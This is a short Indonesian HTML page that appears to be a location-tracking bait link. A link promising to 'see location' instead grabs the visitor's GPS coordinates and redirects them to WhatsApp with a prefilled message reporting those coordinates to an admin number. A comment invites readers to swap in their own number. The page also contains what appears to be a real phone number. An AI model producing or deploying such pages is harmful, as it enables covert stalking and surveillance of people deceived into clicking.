<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Track Klik Lokasi</title>
</head>
<body>
    <h2>Klik Link Ini untuk Melihat Lokasi</h2>
    <a href="#" onclick="getLocation()">Klik di sini</a>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function (position) {
                    let latitude = position.coords.latitude;
                    let longitude = position.coords.longitude;
                    let googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                    
                    // Kirim ke WhatsApp Admin
                    let adminPhone = "6285211226976"; // Ganti dengan nomor WA Anda
                    let message = `Ada yang klik link! Lokasi mereka: ${googleMapsLink}`;
                    let whatsappLink = `https://wa.me/${adminPhone}?text=${encodeURIComponent(message)}`;
                    
                    // Redirect ke WhatsApp Admin
                    window.location.href = whatsappLink;

                }, function (error) {
                    alert("Gagal mendapatkan lokasi! Pastikan GPS aktif.");
                });
            } else {
                alert("Geolocation tidak didukung oleh browser ini.");
            }
        }
    </script>
</body>
</html>
